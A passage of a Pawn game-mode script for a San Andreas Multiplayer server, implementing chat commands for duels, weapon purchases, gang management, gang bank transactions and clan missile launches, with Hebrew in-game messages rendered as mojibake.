			if(playerinfo[playerid][frozen]) return SendClientMessage(playerid,red,".ьр Ёщ·я ьр∙° ў°с ы∙р∙° р·ф сЇ°щц");
			if(playerinfo[playerinfo[playerid][binvited]][frozen]) return SendClientMessage(playerid,red,".ф∙чўя ∙фцющя рх·ъ сЇ°щц, хьыя ьр Ёщ·я ьр∙° р· фў°с ыЄ·");
			new world = GetEmptyWorld();
			if(world == -1) return SendClientMessage(playerid,red," .ьр фщф Ёщ·я ьфыЁщё рх·ъ ьў°с");
			playerinfo[playerid][bstyle][0] = playerinfo[playerinfo[playerid][binvited]][bstyle][0],
			playerinfo[playerid][bstyle][1] = playerinfo[playerinfo[playerid][binvited]][bstyle][1],
			playerinfo[playerid][bplace] = playerinfo[playerinfo[playerid][binvited]][bplace],
			playerinfo[playerid][btime] = playerinfo[playerinfo[playerid][binvited]][btime],
			playerinfo[playerid][inbattle] = 1, playerinfo[playerinfo[playerid][binvited]][inbattle] = 1,
			playerinfo[playerid][bcd][0] = 5, playerinfo[playerinfo[playerid][binvited]][bcd][0] = 5;
			SetTimerPck(playerinfo[playerid][bcd][1],"BattleCD",1000,1,"ii",playerid,playerinfo[playerid][binvited]);
			SendClientMessage(playerid,green," .рщ∙°· р· ффцюЁф ьў°с");
			format(string,sizeof(string)," .рщ∙° р· ффцюЁф ьў°с %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][binvited],green,string);
			playerinfo[playerid][lastrec] = 0;
			new bp = playerinfo[playerid][bplace] - 1, inter = (playerinfo[playerinfo[playerid][binvited]][bstyle][0] == 2) ? 0 : BattleInteriors[bp];
			SetPlayerPos(playerid,BattlePositions[bp][0],BattlePositions[bp][1],BattlePositions[bp][2]);
			SetPlayerFacingAngle(playerid,BattlePositions[bp][3]);
			SetCameraBehindPlayer(playerid);
			SetPlayerInterior(playerid, inter), SetPlayerInterior(playerinfo[playerid][binvited], inter);
			SetPlayerPos(playerinfo[playerid][binvited],BattlePositions2[bp][0],BattlePositions2[bp][1],BattlePositions2[bp][2]);
			SetPlayerFacingAngle(playerinfo[playerid][binvited],BattlePositions2[bp][3]);
			SetCameraBehindPlayer(playerinfo[playerid][binvited]);
			//SetPlayerInterior(playerinfo[playerid][binvited],BattleInteriors[bp]);
			SetPlayerVirtualWorld(playerid,world);
			SetPlayerVirtualWorld(playerinfo[playerid][binvited],world);
			playerinfo[playerid][noend] = 1;
			playerinfo[playerinfo[playerid][binvited]][noend] = 1;
			ResetWeapons(playerid);
			ResetWeapons(playerinfo[playerid][binvited]);
			playerinfo[playerid][spweapon] = spw_none;
			new i = playerinfo[playerid][bstyle][1];
			switch(playerinfo[playerid][bstyle][0])
			{
				case 0: if(i != sizeof(Ammunation))
				{
					GiveWeapon(playerid,Ammunation[i][aID],10000);
					GiveWeapon(playerinfo[playerid][binvited],Ammunation[i][aID],10000);
				}
				case 1: if(BattleStyles[i][bsWeapons][0] != 99) for(new j = 0; j < 5; j++) if(BattleStyles[i][bsWeapons][j] != -1)
				{
					GiveWeapon(playerid,BattleStyles[i][bsWeapons][j] >= 100 ? ChoosenWeapon(playerid,BattleStyles[i][bsWeapons][j]-100) : BattleStyles[i][bsWeapons][j],10000);
					GiveWeapon(playerinfo[playerid][binvited],BattleStyles[i][bsWeapons][j] >= 100 ? ChoosenWeapon(playerinfo[playerid][binvited],BattleStyles[i][bsWeapons][j]-100) : BattleStyles[i][bsWeapons][j],10000);
				}
				case 2:
				{
					playerinfo[playerid][vtemp] = CreateVehicleEx(VBattleStyles[i][vbsModel],VBattleStyles[i][vbsPos1][0],VBattleStyles[i][vbsPos1][1],VBattleStyles[i][vbsPos1][2],VBattleStyles[i][vbsPos1][3],-1,-1,.interior=0,.world=world);
					playerinfo[playerinfo[playerid][binvited]][vtemp] = CreateVehicleEx(VBattleStyles[i][vbsModel],VBattleStyles[i][vbsPos2][0],VBattleStyles[i][vbsPos2][1],VBattleStyles[i][vbsPos2][2],VBattleStyles[2][vbsPos1][3],-1,-1,.interior=0,.world=world);
					SetVehicleHealth(playerinfo[playerid][vtemp],VBattleStyles[i][vbsHealth]);
					SetVehicleHealth(playerinfo[playerinfo[playerid][binvited]][vtemp],VBattleStyles[i][vbsHealth]);
					PutPlayerInVehicle(playerid,playerinfo[playerid][vtemp],0);
					PutPlayerInVehicle(playerinfo[playerid][binvited],playerinfo[playerinfo[playerid][binvited]][vtemp],0);
				}
			}
			SetPlayerHealth(playerid,100.0);
			SetPlayerArmour(playerid,100.0);
			SetPlayerHealth(playerinfo[playerid][binvited],100.0);
			SetPlayerArmour(playerinfo[playerid][binvited],100.0);
			SetFreeze(playerid,1);
			SetFreeze(playerinfo[playerid][binvited],1);
		}
		else if(equal(cmd,"cancel"))
		{
			new string[M_S];
			if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .р·ф ыс° сў°с");
			if(playerinfo[playerid][binvited] == -1) return SendClientMessage(playerid,red," .ьр фхцюЁ· ьў°с");
			SendClientMessage(playerid,green," .сщшь· р· ффцюЁф ьў°с");
			format(string,sizeof(string)," .сщшь р· ффцюЁф ьў°с %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][binvited],green,string);
			playerinfo[playerinfo[playerid][binvited]][lastrec] = 0;
			playerinfo[playerinfo[playerid][binvited]][binviter] = 0, playerinfo[playerid][binviter] = 0, playerinfo[playerinfo[playerid][binvited]][binvited] = -1, playerinfo[playerid][binvited] = -1;
		}
		else if(equal(cmd,"quit"))
		{
		    if(playerinfo[playerid][noend] == 1) return SendClientMessage(playerid,red," .р·ф ьр щыхь ьсшь р· фў°с ыЄ·, рЁр фю·я ьёхє фёЇщ°ф");
			if(!playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .р·ф ьр сў°с");
			new Float:x, Float:y, Float:z;
			GetPlayerPos(playerid, x, y, z);
			playerinfo[playerid][battlex] = x;
			playerinfo[playerid][battley] = y;
			playerinfo[playerid][battlez] = z;
			SendClientMessage(playerid, green, " .сч°· ьЎр· юфў°с. рЁр Єюху сюўхюъ ью∙ъ 3 ∙Ёщх·");
			KillTimer(playerinfo[playerid][battletimer]);
			playerinfo[playerid][battletimer] = SetTimerEx("EndDuel", 3000, 0, "dd", playerid, playerinfo[playerid][binvited]);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ў°с ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/duelinfo") || equal(cmd,"/dueldetails"))
	{
		if(!strlen(battleDialog)) return SendClientMessage(playerid,red," .суўх· фрч°хЁх· ьр фщф ∙хэ ў°с");
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(orange) "Ї°шщ фў°с фрч°хя",battleDialog,"ётх°","");
		return 1;
	}
	if(equal(cmd,"/sbuyweapon") || equal(cmd,"/sbw"))
	{
		new weaponid, times, string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_sammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ фёхущ· сыущ ьсЎЄ Їўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /sbw [weapon number] [times] :Ўх°· ф∙щюх∙");
		weaponid = strval(cmd), cmd = strtok(cmdtext,idx), times = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(weaponid < 0 || weaponid > sizeof(SAmmunation)) return SendClientMessage(playerid,red," .юёЇ° Ё∙ў ∙тхщ");
		if(times < 1) return SendClientMessage(playerid,red," .юёЇ° ЇЄющ ўЁщщф Ёюхъ юущ");
		if(times > 20) return SendClientMessage(playerid,red," .юёЇ° ЇЄющ ўЁщщф тухь юущ - юўёщюхэ 20 ЇЄющэ");
		if(GetMoney(playerid) < (SAmmunation[weaponid][aCost]*times)) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє сыущ ьўЁх· р· фЁ∙ў фцф");
		GiveWeapon(playerid,SAmmunation[weaponid][aID],SAmmunation[weaponid][aAmmo]*times);
		GiveMoney(playerid,0-(SAmmunation[weaponid][aCost]*times),17);
		if(times != 1) format(string,sizeof(string)," .ючЁх· фЁ∙ўщэ фёхущ· %s °ы∙· %d ЇЄющэ р· фЁ∙ў",SAmmunation[weaponid][aName],times);
		else format(string,sizeof(string)," .ючЁх· фЁ∙ўщэ фёхущ· %s °ы∙· р· фЁ∙ў",SAmmunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/sweaponlist") || equal(cmd,"/swl"))
	{
		new string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_sammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ фёхущ· сыущ ьсЎЄ Їўхуф цх");
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· фЁ∙ўщэ ∙ь чЁх· фЁ∙ўщэ фёхущ· ~~~");
		for(new i=0;i<sizeof(SAmmunation);i+=2)
		{
			format(string,sizeof(string)," %d. %s - %d$ | %d. %s - %d$",i,SAmmunation[i][aName],SAmmunation[i][aCost],i+1,SAmmunation[i+1][aName],SAmmunation[i+1][aCost]);
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/ccsbuyweapon") || equal(cmd,"/ccsbw"))
	{
		new weaponid, times, string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_sammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ фёхущ· сыущ ьсЎЄ Їўхуф цх");
		if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .рщя ьъ ы°шщё р∙°рщ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /ccsbw [weapon number] [times] :Ўх°· ф∙щюх∙");
		weaponid = strval(cmd), cmd = strtok(cmdtext,idx), times = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(weaponid < 0 || weaponid > sizeof(SAmmunation)) return SendClientMessage(playerid,red," .юёЇ° Ё∙ў ∙тхщ");
		if(times < 1) return SendClientMessage(playerid,red," .юёЇ° ЇЄющ ўЁщщф Ёюхъ юущ");
		if(times > 20) return SendClientMessage(playerid,red," .юёЇ° ЇЄющ ўЁщщф тухь юущ - юўёщюхэ 20 ЇЄющэ");
		if(playerinfo[playerid][bank] < (SAmmunation[weaponid][aCost]*times)) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє сыущ ьўЁх· р· фЁ∙ў фцф");
		GiveWeapon(playerid,SAmmunation[weaponid][aID],SAmmunation[weaponid][aAmmo]*times);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Bank",playerinfo[playerid][bank]);
		if(times != 1) format(string,sizeof(string)," .ючЁх· фЁ∙ўщэ фёхущ· сы°шщё р∙°рщ %s °ы∙· %d ЇЄющэ р· фЁ∙ў",SAmmunation[weaponid][aName],times);
		else format(string,sizeof(string)," .ючЁх· фЁ∙ўщэ фёхущ· сы°шщё р∙°рщ %s °ы∙· р· фЁ∙ў",SAmmunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		if(times > 1) format(string,sizeof(string)," (юёЇ° ЇЄющэ: %d) %s ўЁщ· сЄц°· ы°шщё р∙°рщ ючЁх· фЁ∙ўщэ фёхущ· р· фЁ∙ў",times,SAmmunation[weaponid][aName]);
		else format(string,sizeof(string)," %s ўЁщ· сЄц°· ы°шщё р∙°рщ ючЁх· фЁ∙ўщэ фёхущ· р· фЁ∙ў",times,SAmmunation[weaponid][aName]);
		UpdateBank(GetName(playerid),string,0-(SAmmunation[weaponid][aCost]*times));
		new str[M_S];
		format(str, sizeof(str), "lost %d (buy weapons)", SAmmunation[weaponid][aCost]*times);
		Log("Money", playerid, str);
		return 1;
	}
	if(equal(cmd,"/airstrike"))
	{
		if(GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != world_normal) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ ыря с·Ї°щш ю·ўЇх· рхщ°щх·");
		ShowPlayerDialog(playerid,dialog_airstrike,DIALOG_STYLE_LIST,@c(lightblue) "ю·ўЇх· рхщ°щх·","∙ющ°· ющўхэ ью·ўЇф\nю·ўЇф Ўсрщ· с°юф 1\nю·ўЇф Ўсрщ· с°юф 2\nю·ўЇф Ўсрщ· с°юф 3\nю·ўЇф ршхющ·\nю·ўЇ· чщщц°щэ","сч°","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/gang"))
	{
		new string[M_S];
		if(playerinfo[playerid][level] < 2) return SendClientMessage(playerid,red," .Ёщ·я ьЇ·хч ыЁхЇщщф °ў ю°юф 2 хюЄьф");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /gang create [name] :щЎщ°· ыЁхЇщщф");
			SendClientMessage(playerid,white," /gang invite [id/name] :фцюЁф ьыЁхЇщщф");
			SendClientMessage(playerid,white," /gang accept :рщ∙х° фцюЁф ьыЁхЇщщф");
			SendClientMessage(playerid,white," /gang cancel :сщшхь фцюЁф ьыЁхЇщщф");
			SendClientMessage(playerid,white," /gang quit :щЎщрф юфыЁхЇщщф");
			SendClientMessage(playerid,white," /gang kick [id/name] :фхЎрф юфыЁхЇщщф");
			SendClientMessage(playerid,white," /gang leader [id/name] :счщ°· ьщу° ьыЁхЇщщф");
			return 1;
		}
		if(equal(cmd,"create"))
		{
			if(playerinfo[playerid][gang] > 0) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сыЁхЇщщф ыь∙фщ·");
			if(playerinfo[playerid][clan] > 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфщх· сыЁхЇщщф ыр∙° р·ф сўьря");
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gang create [name] :Ўх°· ф∙щюх∙");
			if(advertisement(cmd,"Ї·щч· трЁт (Їўхуф)",playerid,"found in /gang create")) return 1;
			for(new i=1;i<MAX_PLAYERS;i++)
			{
				if(ganginfo[i][gexist] == 0)
				{
					format(ganginfo[i][gname],256,"%s",cmd);
					ganginfo[i][gexist] = 1;
					ganginfo[i][gmembers] = 1;
					ganginfo[i][gleader] = playerid;
					ganginfo[i][gbank] = 0;
					for(new j=0;j<3;j++) ganginfo[i][gcolor][j] = playerinfo[playerid][color][j];
					ganginfo[i][gplayers][0] = playerid;
					format(string,sizeof(string)," .\"%s\" щЎ°· р· фыЁхЇщщф",ganginfo[i][gname]);
					SendClientMessage(playerid,green,string);
					playerinfo[playerid][gang] = i;
					return 1;
				}
			}
		}
		else if(equal(cmd,"invite"))
		{
			if(!playerinfo[playerid][invitetime][0]) return SendClientMessage(playerid,red," .·хыь ь∙ьхч фцюЁх· ∙хс сў°хс");
			if(playerinfo[playerid][gang] == 0) return SendClientMessage(playerid,red," .р·ф ьр сыЁхЇщщф");
			if(ganginfo[playerinfo[playerid][gang]][gleader] != playerid) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фьщу° ∙ь фыЁхЇщщф сыущ ьфцющя");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gang invite [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфцющя р· ЄЎюъ");
			if(playerinfo[id][gang] > 0)
			{
				format(string,sizeof(string)," .ыс° ЁюЎр сыЁхЇщщф %s",GetName(id));
				return SendClientMessage(playerid,red,string);
			}
			playerinfo[playerid][invitetime][0]--;
			format(string,sizeof(string)," .ьыЁхЇщщф %s фцюЁ· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," /accept :ьфЎш°Їх· ,\"%s\" ∙ьч ьъ фцюЁф ьыЁхЇщщф %s",ganginfo[playerinfo[playerid][gang]][gname],GetName(playerid));
			SendClientMessage(id,green,string);
			playerinfo[id][igang] = playerinfo[playerid][gang];
			playerinfo[id][lastrec] = 4;
		}
		else if(equal(cmd,"accept"))
		{
	 		if(playerinfo[playerid][igang] == 0) return SendClientMessage(playerid,red," .ьр фхцюЁ· ь∙хэ ыЁхЇщщф");
			if(playerinfo[playerid][gang] > 0) return SendClientMessage(playerid,red," .р·ф ыс° сыЁхЇщщф");
			if(playerinfo[playerid][clan] > 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфщх· сыЁхЇщщф ыр∙° р·ф сўьря");
			if(ganginfo[playerinfo[playerid][igang]][gexist] == 0) SendClientMessage(playerid,red, " .фыЁхЇщщф фцх ыс° ьр ўщщю· щх·°");
			if(ganginfo[playerinfo[playerid][igang]][gmembers] >= 25) return SendClientMessage(playerid,red," .фыЁхЇщщф фцх юьрф");
			ganginfo[playerinfo[playerid][igang]][gplayers][ganginfo[playerinfo[playerid][igang]][gmembers]] = playerid;
			for(new j=0;j<ganginfo[playerinfo[playerid][igang]][gmembers];j++)
			{
				format(string,sizeof(string)," .фЎш°є ьыЁхЇщф ∙ьъ %s",GetName(playerid));
				SendClientMessage(ganginfo[playerinfo[playerid][igang]][gplayers][j],green,string);
			}
			ganginfo[playerinfo[playerid][igang]][gmembers]++;
			playerinfo[playerid][gang] = playerinfo[playerid][igang];
			SetPlayerColor(playerid,rgba2hex(ganginfo[playerinfo[playerid][igang]][gcolor][0],ganginfo[playerinfo[playerid][igang]][gcolor][1],ganginfo[playerinfo[playerid][igang]][gcolor][2],PLAYER_ALPHA));
			format(string,sizeof(string)," .\"%s\" фЎш°Ї· ьыЁхЇщщф",ganginfo[playerinfo[playerid][igang]][gname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][igang] = 0;
			playerinfo[playerid][lastrec] = 0;
		}
		else if(equal(cmd,"cancel"))
		{
	 		if(playerinfo[playerid][igang] == 0) return SendClientMessage(playerid,red," .ьр фхцюЁ· ь∙хэ ыЁхЇщщф");
			if(ganginfo[playerinfo[playerid][igang]][gexist] == 0) return SendClientMessage(playerid,red, " .фыЁхЇщщф фцх ыс° ьр ўщщю· щх·°");
			for(new j=0;j<ganginfo[playerinfo[playerid][igang]][gmembers];j++)
			{
				format(string,sizeof(string)," .сщшь р· ффцюЁф ьфЎш°Їх· ьыЁхЇщщф ∙ьъ %s",GetName(playerid));
				SendClientMessage(ganginfo[playerinfo[playerid][igang]][gplayers][j],green,string);
			}
			format(string,sizeof(string)," .\"%s\" сщшь· р· ффцюЁф ьфЎш°Їх· ьыЁхЇщщф",ganginfo[playerinfo[playerid][igang]][gname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][igang] = 0;
			playerinfo[playerid][lastrec] = 0;
		}
		else if(equal(cmd,"quit"))
		{
			if(playerinfo[playerid][gang] == 0) return SendClientMessage(playerid,red," .р·ф ьр сыЁхЇщщф");
			PlayerLeaveGang(playerid,1);
		}
		else if(equal(cmd,"kick"))
		{
			if(playerinfo[playerid][gang] == 0) return SendClientMessage(playerid,red," .р·ф ьр сыЁхЇщщф");
			if(ganginfo[playerinfo[playerid][gang]][gleader] != playerid) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фьщу° ∙ь фыЁхЇщщф сыущ ьфхЎщр");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gang kick [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфхЎщр р· ЄЎюъ");
			if(playerinfo[id][gang] != playerinfo[playerid][gang])
			{
				format(string,sizeof(string)," .ьр ЁюЎр сыЁхЇщщф ∙ьъ %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			format(string,sizeof(string)," .юфыЁхЇщщф %s фхЎр· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .\"%s\" фхЎщр рх·ъ юфыЁхЇщщф %s",ganginfo[playerinfo[playerid][gang]][gname],GetName(playerid));
			SendClientMessage(id,green,string);
			PlayerLeaveGang(id,2);
		}
		else if(equal(cmd,"leader"))
		{
			if(playerinfo[playerid][gang] == 0) return SendClientMessage(playerid,red," .р·ф ьр сыЁхЇщщф");
			if(ganginfo[playerinfo[playerid][gang]][gleader] != playerid) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фьщу° ∙ь фыЁхЇщщф сыущ ьфЇхъ ∙чўя ььщу°");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gang leader [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(playerinfo[id][gang] != playerinfo[playerid][gang])
			{
				format(string,sizeof(string)," .ьр ЁюЎр сыЁхЇщщф ∙ьъ %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			format(string,sizeof(string)," .ььщу° фыЁхЇщщф, р·ф ыс° ьр ьщу° %s фЇы· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фЇъ рх·ъ ььщу° фыЁхЇщщф %s",GetName(playerid));
			SendClientMessage(id,green,string);
			ganginfo[playerinfo[playerid][gang]][gleader] = id;
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ыЁхЇщщф ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/gdeposit"))
	{
		new amount, string[M_S];
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сыЁхЇщщф ь∙щюх∙ сЇўхуф цх");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /gdeposit [amount] :Ўх°· ф∙щюх∙");
		amount = strval(cmd);
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .ёыхэ фЇўуф ∙тхщ");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		SetTimerEx("CanP",5000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		GiveMoney(playerid,0-amount,29);
		ganginfo[playerinfo[playerid][gang]][gbank] += amount;
		format(string,sizeof(string)," .фЇўу· %d$ сч∙схя фсЁў ∙ь фыЁхЇщщф ∙ьъ, ыЄ· щ∙ сч∙схя %d$",amount,ganginfo[playerinfo[playerid][gang]][gbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/gwithdraw"))
	{
		new amount, string[M_S];
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сыЁхЇщщф ь∙щюх∙ сЇўхуф цх");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /gwithdraw [amount] :Ўх°· ф∙щюх∙");
		amount = strval(cmd);
		if(amount < 1 || amount > ganginfo[playerinfo[playerid][gang]][gbank]) return SendClientMessage(playerid,red," .ёыхэ фхЎрф ∙тхщ");
		GiveMoney(playerid,amount,29);
		ganginfo[playerinfo[playerid][gang]][gbank] -= amount;
		format(string,sizeof(string)," .фхЎр· %d$ юч∙схя фсЁў ∙ь фыЁхЇщщф ∙ьъ, ыЄ· щ∙ сч∙схя %d$",amount,ganginfo[playerinfo[playerid][gang]][gbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/gbalance"))
	{
		new string[M_S];
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сыЁхЇщщф ь∙щюх∙ сЇўхуф цх");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		format(string,sizeof(string)," .%d$ сч∙схя фсЁў ∙ь фыЁхЇщщф ∙ьъ щ∙",ganginfo[playerinfo[playerid][gang]][gbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/ganginfo"))
	{
		new gangid, string[M_S];
		cmd = strtok(cmdtext,idx);
		if((!strlen(cmd) || !IsNumeric(cmd)) && !playerinfo[playerid][gang]) return SendClientMessage(playerid,white," /ganginfo [gang id] :Ўх°· ф∙щюх∙");
		else if((!strlen(cmd) || !IsNumeric(cmd))) gangid = playerinfo[playerid][gang];
		else gangid = strval(cmd);
		if(!ganginfo[gangid][gexist]) return SendClientMessage(playerid,red," .юёЇ° ыЁхЇщщф ∙тхщ");
		format(string,sizeof(string)," :\"%s\" чс°щ фыЁхЇщщф",ganginfo[gangid][gname]);
		SendClientMessage(playerid,green,string);
		for(new i=0;i<ganginfo[gangid][gmembers];i++)
		{
			format(string,sizeof(string),"%s (ID: %d)",GetName(ganginfo[gangid][gplayers][i]),ganginfo[gangid][gplayers][i]);
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/gangs"))
	{
		new gangs = 0, string[M_S];
		SendClientMessage(playerid,green," :ыЁхЇщх· ючхс°х· ь∙°·");
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(ganginfo[i][gexist])
			{
				gangs++;
				format(string,sizeof(string),"\"%s\" (GangID: %d | Members: %d)",ganginfo[i][gname],i,ganginfo[i][gmembers]);
				SendClientMessage(playerid,yellow,string);
			}
		}
		if(gangs == 0) SendClientMessage(playerid,red," .рщя ыЄ· ыЁхЇщх· ючхс°х· ь∙°·");
		return 1;
	}
	if(equal(cmd,"/gdepositall"))
	{
		new string[M_S];
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сыЁхЇщщф ь∙щюх∙ сЇўхуф цх");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		if(GetMoney(playerid) <= 0) return SendClientMessage(playerid,red," .рщя сщщуъ ыёє фЁщ·я ьфЇўуф");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		SetTimerEx("CanP",5000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		ganginfo[playerinfo[playerid][gang]][gbank] += GetMoney(playerid);
		new logt[M_S];
		format(logt, M_S, "lost %d (gang bank)", GetMoney(playerid));
		Log("Money", playerid, logt);
		ResetMoney(playerid);
		format(string,sizeof(string)," .фЇўу· р· ыь ыёЇъ сч∙схя фсЁў ∙ь фыЁхЇщщф ∙ьъ, ыЄ· щ∙ ∙э %d$",playerinfo[playerid][bank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/gwithdrawall"))
	{
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сыЁхЇщщф ь∙щюх∙ сЇўхуф цх");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		GiveMoney(playerid,ganginfo[playerinfo[playerid][gang]][gbank],29);
		ganginfo[playerinfo[playerid][gang]][gbank] = 0;
		SendClientMessage(playerid,green," .фхЎр· р· ыь фыёє юч∙схя фсЁў ∙ь фыЁхЇщщф ∙ьъ");
		return 1;
	}
	if(equal(cmd,"/clan") || equal(cmd,"/c"))
	{
		if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря °∙ющ ыущ ьф∙·ю∙ сЇўхуф фцх");
		return ShowPlayerConstDialog(playerid,dialog_clan);
	}
	if(equal(cmd,"/launch"))
	{
	    if(playerinfo[playerid][castle] == -1) return SendClientMessage(playerid,red," .Єь юЁ· ьсЎЄ Їўхуф цх Єьщъ ьфщх· сшщ°ф");
		if(cainfo[playerinfo[playerid][castle]][caCapture] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .°ў ∙ьщшщ фшщ°ф щыхьщэ ьф∙·ю∙ сю∙т° фшщьщэ");
		if(cainfo[playerinfo[playerid][castle]][caMissiles]) return SendClientMessage(playerid,red," .фўьря ∙ьъ ыс° ф∙·ю∙ сю∙т° фшщьщэ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /launch [clan name] :Ўх°· ф∙щюх∙");
		new c = clannumber(cmd), a = playerinfo[playerid][castle], string[M_S];
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(!claninfo[c][hashq]) return SendClientMessage(playerid,red," .ьўьря цф рщя юЇўуф");
